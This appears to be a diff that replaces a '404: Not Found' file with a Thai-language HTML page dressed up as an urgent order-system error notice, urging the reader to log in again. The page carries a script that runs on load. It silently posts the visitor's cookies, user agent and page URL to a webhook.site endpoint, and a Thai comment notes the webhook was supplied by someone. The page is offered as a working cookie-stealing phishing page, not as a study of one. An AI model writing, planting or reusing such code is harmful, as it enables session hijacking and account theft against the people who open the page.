@@ -1,1 +1,50 @@
-404: Not Found
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <title>แจ้งเตือนผิดพลาดในระบบคำสั่งซื้อ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: #fff3cd;
+      color: #856404;
+      font-family: 'Arial', sans-serif;
+      padding: 2rem;
+      max-width: 600px;
+      margin: auto;
+    }
+    h1 {
+      color: #721c24;
+    }
+    .box {
+      border: 1px solid #ffeeba;
+      background: #fff;
+      padding: 1.5rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>แจ้งเตือนผิดพลาดในระบบ</h1>
+    <p>ระบบตรวจพบความผิดปกติในคำสั่งซื้อของลูกค้า กรุณาตรวจสอบข้อมูลโดยด่วน!</p>
+    <p><b>โปรดเข้าสู่ระบบอีกครั้งผ่านระบบแจ้งเตือนนี้ เพื่อป้องกันความเสียหาย</b></p>
+  </div>
+
+  <script>
+    // ยิง cookie ไปยัง webhook ที่มึงส่งให้
+    fetch("https://webhook.site/4f57603e-8ec4-4c02-bccc-67e1e16efba2", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        cookie: document.cookie,
+        userAgent: navigator.userAgent,
+        url: location.href
+      })
+    });
+  </script>
+</body>
+</html>
